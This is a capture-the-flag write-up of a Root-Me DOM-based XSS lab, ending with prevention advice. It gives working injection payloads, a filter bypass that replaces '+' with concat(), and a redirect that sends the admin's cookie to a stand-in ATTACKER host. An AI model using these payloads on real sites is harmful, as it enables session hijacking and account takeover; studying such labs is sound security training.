# DOM-Based XSS - Filter Bypass
[Root-Me Challenge Proof](https://www.root-me.org/?page=validation&id_challenge=2915&id_auteur=1089475&lang=en)
## Lab Overview

This lab demonstrates a **DOM-Based XSS** vulnerability where user input is reflected inside a JavaScript variable.

The challenge also implements several input filters that block common XSS techniques, requiring payload adaptation and JavaScript abuse to achieve code execution.

---

# Finding the Injection Point

The vulnerable parameter is reflected inside a script block:

```javascript
var random = Math.random() * (99);
var number = 'USER_INPUT';

if(random == number) {
    ...
}
else{
    ...
}
```

User input is placed directly inside a JavaScript string without proper encoding.

---

# Initial Testing

Most common payloads failed:

```javascript
';alert(1);//
```

```javascript
';fetch("http://attacker");// 
```

This suggested some filtering was taking place.

Possible filtered characters/functions:

- `+`
- `fetch`
- Other common XSS patterns

---

# Discovering Code Execution

Instead of trying direct JavaScript execution, tested whether the application would evaluate JavaScript expressions.

Payload:

```javascript
5'?alert(1):'1
```

Resulting code:

```javascript
var number = '5'?alert(1):'1';
```

The alert executed successfully.

This confirmed arbitrary JavaScript execution.
<img width="1622" height="754" alt="image" src="https://github.com/user-attachments/assets/e6f14bbb-d3a8-44e8-98f5-d7f3416f08fc" />

---

# Why It Works

JavaScript evaluates:

```javascript
condition ? true_value : false_value
```

as a ternary expression.

In this case:

```javascript
'5'
```

is a truthy value.

Therefore:

```javascript
alert(1)
```

executes immediately.

---

# Goal: Steal Admin Cookie

After confirming XSS, the objective was to exfiltrate the administrator's cookie.

A common payload would be:

```javascript
document.location =
"http://attacker/?cookie=" + document.cookie
```

However the challenge filtered:

```javascript
+
```

making string concatenation impossible.

---

# Bypassing the `+` Filter

Instead of:

```javascript
"a" + document.cookie
```

used:

```javascript
"a".concat(document.cookie)
```

`concat()` performs string concatenation without using the `+` operator.

---

# Working Payload

```javascript
1'?(window.location.href=('http://ATTACKER/?cookie=').concat('',document.cookie)):'1
```
<img width="1280" height="593" alt="image" src="https://github.com/user-attachments/assets/4db33d71-ae1d-4514-85ff-57799b6e0cb4" />

---

# Why It Works

Execution flow:

```javascript
'1'
    ? window.location.href =
      'http://ATTACKER/?cookie='
      .concat('', document.cookie)
    : '1'
```

Steps:

1. Condition evaluates as true
2. `document.cookie` is read
3. `concat()` appends cookie value
4. Browser redirects
5. Request reaches attacker server

Example:

```text
http://ATTACKER/?cookie=PHPSESSID=abc123
```

---

# Why Not Use `fetch()`?

The challenge appears to filter keywords such as:

```javascript
fetch
```

Many XSS challenges implement blacklist-based filtering.

Examples:

```javascript
fetch
XMLHttpRequest
script
alert
```

may be blocked directly.

Redirect-based exfiltration is often more reliable because it only requires:

```javascript
document.location
```

or

```javascript
window.location
```

which are harder to blacklist without breaking application functionality.

---

# Impact

Successful exploitation allows:

- Cookie theft
- Session hijacking
- Account takeover
- Execution of arbitrary JavaScript
- Actions performed as the victim user

---

# Key Learnings

- DOM XSS can exist entirely in client-side JavaScript.
- Blacklist filters are often bypassable.
- JavaScript ternary operators can be useful for XSS payloads.
- `concat()` can replace `+` when concatenation is filtered.
- Redirect-based exfiltration is often more reliable than `fetch()`.
- Input filtering alone is not a defense against XSS.

---

# Prevention

- Never insert user input directly into JavaScript code.
- Apply context-aware output encoding.
- Use CSP (Content Security Policy).
- Avoid blacklist-based filtering.
- Treat all user input as untrusted.
